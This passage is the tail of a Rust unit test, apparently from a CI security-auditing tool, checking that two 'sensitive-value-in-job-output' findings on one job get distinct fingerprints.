        let fp_b = crate::finding::compute_fingerprint(&findings[1], &g);
        assert_ne!(
            fp_a, fp_b,
            "two sensitive-value-in-job-output findings on the same job must produce \
             distinct fingerprints (v3 anchor contract)"
        );
    }
}
